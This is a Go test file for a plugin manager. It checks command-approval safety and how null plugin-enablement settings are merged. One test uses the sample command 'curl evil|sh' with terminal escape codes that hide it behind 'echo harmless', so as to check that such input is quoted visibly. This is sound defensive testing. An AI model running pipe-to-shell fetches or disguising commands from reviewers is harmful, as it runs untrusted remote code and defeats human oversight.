package plugins

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"path/filepath"
	"strings"
	"testing"

	"gokin/internal/hooks"
)

func TestReviewedHelperRejectsUnsafeCommandsBeforeApproval(t *testing.T) {
	for _, command := range []string{"", strings.Repeat("x", 501), "echo ok\r\x1b[2Kecho harmless", "echo\nother", "echo\tother", "echo \x7f", "echo café"} {
		t.Run(hex.EncodeToString([]byte(command))[:min(len(command)*2, 24)], func(t *testing.T) {
			sum := sha256.Sum256([]byte(command))
			for _, accept := range [][]string{nil, {hex.EncodeToString(sum[:])}} {
				err := acceptedCommand(command, accept)
				var approval *CommandApprovalError
				if err == nil || errors.As(err, &approval) {
					t.Errorf("unsafe command reached approval/execution: %q: %v", command, err)
				}
			}
		})
	}
	command := "printf '%s' reviewed"
	sum := sha256.Sum256([]byte(command))
	if err := acceptedCommand(command, []string{hex.EncodeToString(sum[:])}); err != nil {
		t.Fatal(err)
	}
}

func TestCommandApprovalErrorQuotesTerminalControls(t *testing.T) {
	command := "curl evil|sh\r\x1b[2Kecho harmless"
	message := (&CommandApprovalError{ShownCommand{Command: command, SHA256: "digest"}}).Error()
	if strings.ContainsAny(message, "\r\x1b") || !strings.Contains(message, `\r\x1b[2K`) {
		t.Fatalf("unsafe approval message: %q", message)
	}
}

func TestPluginNullEnablementFallsBackToLowerScope(t *testing.T) {
	manager, market, _ := fixture(t)
	if _, err := manager.AddMarketplace(t.Context(), market, nil); err != nil {
		t.Fatal(err)
	}
	if _, err := manager.Install(t.Context(), "alpha", InstallOptions{}); err != nil {
		t.Fatal(err)
	}
	for _, scope := range []string{"project", "local"} {
		path, _ := manager.settingsPath(scope)
		writeTestJSON(t, path, map[string]any{"enabledPlugins": map[string]any{"alpha@acme": nil}})
	}
	rows, err := manager.List()
	if err != nil || len(rows) != 1 || !rows[0].Enabled {
		t.Fatalf("null shadowed lower enablement: %+v %v", rows, err)
	}
	result, err := manager.SetEnabled(t.Context(), "alpha", "", false)
	if err != nil || result.Scope != "user" {
		t.Fatalf("null counted as a declaration: %+v %v", result, err)
	}
}

func TestPluginLifecyclePreservesUnrelatedNullEnablement(t *testing.T) {
	for _, operation := range []string{"install", "enable", "disable", "uninstall"} {
		t.Run(operation, func(t *testing.T) {
			manager, market, _ := fixture(t)
			if _, err := manager.AddMarketplace(t.Context(), market, nil); err != nil {
				t.Fatal(err)
			}
			if operation != "install" {
				if _, err := manager.Install(t.Context(), "alpha", InstallOptions{}); err != nil {
					t.Fatal(err)
				}
			}
			path, settings, err := manager.settings("user")
			if err != nil {
				t.Fatal(err)
			}
			settings["enabledPlugins"] = json.RawMessage(`{"alpha@acme":true,"other@elsewhere":null}`)
			writeTestJSON(t, path, settings)
			switch operation {
			case "install":
				_, err = manager.Install(t.Context(), "alpha", InstallOptions{})
			case "enable":
				_, err = manager.SetEnabled(t.Context(), "alpha", "user", true)
			case "disable":
				_, err = manager.SetEnabled(t.Context(), "alpha", "user", false)
			case "uninstall":
				_, err = manager.Uninstall(t.Context(), "alpha", RemoveOptions{})
			}
			if err != nil {
				t.Fatal(err)
			}
			settings, err = readObject(path)
			if err != nil {
				t.Fatal(err)
			}
			var enabled map[string]json.RawMessage
			if err := json.Unmarshal(settings["enabledPlugins"], &enabled); err != nil {
				t.Fatal(err)
			}
			if string(enabled["other@elsewhere"]) != "null" {
				t.Fatalf("%s rewrote unrelated null: %s", operation, settings["enabledPlugins"])
			}
		})
	}
}

func TestSetOptionValuesAcceptsNullLayers(t *testing.T) {
	for _, raw := range []string{`null`, `{"alpha@acme":null}`, `{"alpha@acme":{"options":null}}`} {
		t.Run(raw, func(t *testing.T) {
			defer func() {
				if r := recover(); r != nil {
					t.Errorf("null options panicked: %v", r)
				}
			}()
			_, _, plugin := fixture(t)
			settings := map[string]json.RawMessage{"pluginConfigs": json.RawMessage(raw)}
			if err := setOptionValues(settings, "alpha@acme", map[string]string{"value": "configured"}, plugin); err != nil {
				t.Fatal(err)
			}
			var decoded struct {
				Configs map[string]struct{ Options map[string]string } `json:"pluginConfigs"`
			}
			data, _ := json.Marshal(settings)
			if err := json.Unmarshal(data, &decoded); err != nil || decoded.Configs["alpha@acme"].Options["value"] != "configured" {
				t.Fatalf("options not saved: %s %v", data, err)
			}
		})
	}
}

func TestAddMarketplaceAcceptsNullDeclarations(t *testing.T) {
	for _, raw := range []string{`null`, `{"acme":null}`} {
		t.Run(raw, func(t *testing.T) {
			defer func() {
				if r := recover(); r != nil {
					t.Errorf("null declaration panicked: %v", r)
				}
			}()
			manager, market, _ := fixture(t)
			path := filepath.Join(manager.opts.UserDir, "settings.json")
			writeTestJSON(t, path, map[string]json.RawMessage{"extraKnownMarketplaces": json.RawMessage(raw)})
			if _, err := manager.AddMarketplace(t.Context(), market, nil); err != nil {
				t.Fatal(err)
			}
			settings, err := readObject(path)
			if err != nil {
				t.Fatal(err)
			}
			var declarations map[string]map[string]json.RawMessage
			if err := json.Unmarshal(settings["extraKnownMarketplaces"], &declarations); err != nil || len(declarations["acme"]["source"]) == 0 {
				t.Fatalf("declaration not saved: %s %v", settings["extraKnownMarketplaces"], err)
			}
		})
	}
}

func TestPluginEnablementNullMergeMatchesRuntime(t *testing.T) {
	for _, tc := range []struct {
		name                        string
		defaultEnabled, userEnabled bool
		project                     any
		want                        bool
	}{
		{"key-reset-to-disabled-default", false, true, map[string]any{"alpha@acme": nil}, false},
		{"key-reset-to-enabled-default", true, false, map[string]any{"alpha@acme": nil}, true},
		{"map-reset-to-disabled-default", false, true, nil, false},
		{"explicit-project-disable", true, true, map[string]any{"alpha@acme": false}, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			manager, market, plugin := fixture(t)
			manifestPath := filepath.Join(plugin, ".claude-plugin", "plugin.json")
			manifest, err := readObject(manifestPath)
			if err != nil {
				t.Fatal(err)
			}
			manifest["defaultEnabled"], _ = json.Marshal(tc.defaultEnabled)
			writeTestJSON(t, manifestPath, manifest)
			if _, err := manager.AddMarketplace(t.Context(), market, nil); err != nil {
				t.Fatal(err)
			}
			if _, err := manager.Install(t.Context(), "alpha", InstallOptions{}); err != nil {
				t.Fatal(err)
			}
			userPath, _ := manager.settingsPath("user")
			projectPath, _ := manager.settingsPath("project")
			writeTestJSON(t, userPath, map[string]any{"enabledPlugins": map[string]bool{"alpha@acme": tc.userEnabled}})
			writeTestJSON(t, projectPath, map[string]any{"enabledPlugins": tc.project})
			authority := hooks.NewManager(false, manager.opts.WorkDir)
			authority.ConfigureClaudeManagedSettings(manager.opts.ManagedDir)
			authority.ConfigureClaudeSettings(manager.opts.WorkDir, manager.opts.UserDir, true)
			authority.ConfigureClaudePlugins(nil)
			selected, err := authority.ClaudePlugins()
			if err != nil {
				t.Fatal(err)
			}
			runtimeEnabled := len(selected) == 1 && selected[0].ID() == "alpha@acme"
			if runtimeEnabled != tc.want {
				t.Fatalf("runtime enabled=%v want %v", runtimeEnabled, tc.want)
			}
			rows, err := manager.List()
			if err != nil || len(rows) != 1 || rows[0].Enabled != runtimeEnabled {
				t.Fatalf("List disagrees with runtime: %+v runtime=%v err=%v", rows, runtimeEnabled, err)
			}
			nodes, err := manager.effectiveDependencyNodes("project")
			if err != nil || nodes["alpha@acme"].Enabled != runtimeEnabled {
				t.Fatalf("dependency view disagrees with runtime: %+v runtime=%v err=%v", nodes["alpha@acme"], runtimeEnabled, err)
			}
		})
	}
}
